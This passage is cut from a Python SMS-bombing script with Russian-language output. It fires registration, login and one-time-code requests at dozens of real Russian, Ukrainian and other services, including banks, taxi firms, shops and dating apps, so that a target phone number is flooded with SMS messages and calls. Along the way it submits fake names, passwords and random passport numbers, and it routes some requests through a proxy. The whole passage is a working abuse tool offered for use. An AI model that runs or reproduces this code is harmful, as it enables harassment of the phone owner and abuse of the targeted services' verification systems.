                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
                ).json()["res"]
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.citrus.ua/api/v2/register",
                    data={
                        "email": email,
                        "name": "Артем",
                        "12phone": _phone,
                        "password": password,
                        "confirm_password": password,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                    json={
                        "FirstName": "Артем",
                        "CellPhone": _phone,
                        "Package": "optimal",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": "Артем", "phone": _phone, "email": _email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://comfy.ua/ua/customer/account/createPost",
                    data={
                        "registration_name": "Артем",
                        "registration_phone": _phoneComfy,
                        "registration_email": _mail,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
                    data={"Phone": _phoneQ},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cinema5.ru/api/phone_code", data={"phone": _phonePizzahut}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.etm.ru/cat/runprog.html",
                    data={
                        "m_phone": _phone,
                        "mode": "sendSms",
                        "syf_prog": "clients-services",
                        "getSysParam": "yes",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://apteka.ru/_action/auth/getForm/",
                    data={
                        "form[NAME]": "",
                        "form[PERSONAL_GENDER]": "",
                        "form[PERSONAL_BIRTHDAY]": "",
                        "form[EMAIL]": "",
                        "form[LOGIN]": _phone585,
                        "form[PASSWORD]": password,
                        "get-new-password": "Получите пароль по SMS",
                        "user_agreement": "on",
                        "personal_data_agreement": "on",
                        "formType": "simple",
                        "utc_offset": "120",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secunda.com.ua/personalarea/registrationvalidphone",
                    data={"ph": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
                    params={"number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.iconjob.co/api/auth/verification_code",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://panda99.ru/bdhandlers/order.php?t={int(time())}",
                    data={"CB_NAME": "Артем", "CB_PHONE": _phone88},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://auth.pizza33.ua/ua/join/check/",
                    params={
                        "callback": "angular.callbacks._1",
                        "email": _email,
                        "password": password,
                        "phone": _phone,
                        "utm_current_visit_started": 0,
                        "utm_first_visit": 0,
                        "utm_previous_visit": 0,
                        "utm_times_visited": 0,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://zoloto585.ru/api/bcard/reg/",
                    json={
                        "name": "Максим",
                        "surname": "Летовал",
                        "patronymic": "Максимович",
                        "sex": "m",
                        "birthdate": "11.11.1999",
                        "phone": _phone585,
                        "email": email,
                        "city": "Москва",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                    data={"phone": _phone585},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
                    data={"Phone": _phoneQ},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                    data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/5/user/otp/generate",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    data={"loginId": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://bamper.by/registration/?step=1",
                    data={
                        "phone": "+" + _phone,
                        "submit": "Запросить смс подтверждения",
                        "rules": "on",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://friendsclub.ru/assets/components/pl/connector.php",
                    data={"casePar": "authSendsms", "MobilePhone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
                    data={"caller_number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.doma.uchi.ru/api/v1/parent/signup_start",
                    json={
                        "phone": "+" + _phone,
                        "first_name": "-",
                        "utm_data": {},
                        "via": "call",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.doma.uchi.ru/api/v1/parent/signup_start",
                    json={
                        "phone": "+" + _phone,
                        "first_name": "-",
                        "utm_data": {},
                        "via": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.icq.com/smsreg/requestPhoneValidation.php",
                    data={
                        "msisdn": _phone,
                        "locale": "en",
                        "countryCode": "ru",
                        "version": "1",
                        "k": "ic1rtwz1s1Hj1O0r",
                        "r": "46763",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shafa.ua/api/v3/graphiql",
                    json={
                        "operationName": "RegistrationSendSms",
                        "variables": {"phoneNumber": "+" + _phone},
                        "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    headers={"Referer": "https://alpari.com/en/registration/"},
                    json={
                        "client_type": "personal",
                        "email": _email,
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://uklon.com.ua/api/v1/account/code/send",
                    headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://crm.getmancar.com.ua/api/veryfyaccount",
                    json={
                        "phone": "+" + _phone,
                        "grant_type": "password",
                        "client_id": "gcarAppMob",
                        "client_secret": "SomeRandomCharsAndNumbersMobile",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                    data={
                        "password": password,
                        "application": "lkp",
                        "login": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secure.ubki.ua/b2_api_xml/ubki/auth",
                    json={
                        "doc": {
                            "auth": {
                                "mphone": "+" + _phone,
                                "bdate": "11.11.1999",
                                "deviceid": "00100",
                                "version": "1.0",
                                "source": "site",
                                "signature": "undefined",
                            }
                        }
                    },
                    headers={"Accept": "application/json"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.top-shop.ru/login/loginByPhone/",
                    data={"phone": _phonePizzahut},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
                    data={"phone": _phonePizzahut, "alien": "0"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://osava.ua/users/sign-up/callbacks",
                    data={"phone_callbacks": _phone, "send_callbacks": "Отправить"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://eda.yandex/api/v1/user/request_authentication_code",
                    json={"phone_number": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://izi.ua/api/auth/register",
                    json={
                        "phone": "+" + _phone,
                        "name": "Анастасия",
                        "is_terms_accepted": True,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.pozichka.ua/v1/registration/send",
                    json={"RegisterSendForm": {"phone": _phonePozichka}},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ontaxi.com.ua/api/v2/web/client",
                    data={"country": "UA", "phone": phone[3:]},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://suandshi.ru/mobile_api/register_mobile_user",
                    params={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
                    data={"data": _phone, "metod": "postreg"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
                    data={"telephone": "8" + _phone[1:]},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": "Артем", "phone": _phone, "email": email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://belkacar.ru/get-confirmation-code",
                    data={"phone": _phone},
                    headers={},
                    proxies=proxies,
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://starpizzacafe.com/mods/a.function.php",
                    data={"aj": "50", "registration-phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/",
                    data={"phone": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.tinkoff.ru/v1/sign_up",
                    data={"phone": "+" + _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://dostavista.ru/backend/send-verification-sms",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.monobank.com.ua/api/mobapplink/send",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}",
                    data={"result": "ok"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://koronapay.com/transfers/online/api/users/otps",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://btfair.site/api/user/phone/code",
                    json={"phone": "+" + _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ggbet.ru/api/auth/register-with-phone",
                    data={
                        "phone": "+" + _phone,
                        "login": _email,
                        "password": password,
                        "agreement": "on",
                        "oferta": "on",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.etm.ru/cat/runprog.html",
                    data={
                        "m_phone": _phone,
                        "mode": "sendSms",
                        "syf_prog": "clients-services",
                        "getSysParam": "yes",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://account.my.games/signup_send_sms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://zoloto585.ru/api/bcard/reg/",
                    json={
                        "name": _name,
                        "surname": _name,
                        "patronymic": _name,
                        "sex": "m",
                        "birthdate": "11.11.1999",
                        "phone": (_phone, "+* (***) ***-**-**"),
                        "email": _email,
                        "city": "Москва",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cloud.mail.ru/api/v2/notify/applink",
                    json={
                        "phone": "+" + _phone,
                        "api": 2,
                        "email": "email",
                        "x-email": "x-email",
                    },
                    proxies={"http": "138.197.137.39:8080"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.creditter.ru/confirm/sms/send",
                    json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register",},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                    headers={
                        "Referer": "https://www.ingos.ru/cabinet/registration/personal"
                    },
                    json={
                        "Birthday": "1986-07-10T07:19:56.276+02:00",
                        "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                        "DocNumber": randint(500000, 999999),
                        "DocSeries": randint(5000, 9999),
                        "FirstName": _name,
                        "Gender": "M",
                        "LastName": _name,
                        "SecondName": _name,
                        "Phone": _phone,
                        "Email": _email,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://win.1admiralxxx.ru/api/en/register.json",
                    json={
                        "mobile": _phone,
                        "bonus": "signup",
                        "agreement": 1,
                        "currency": "RUB",
                        "submit": 1,
                        "email": "",
                        "lang": "en",
                    },
                )
                kk = kk + 1
                print(
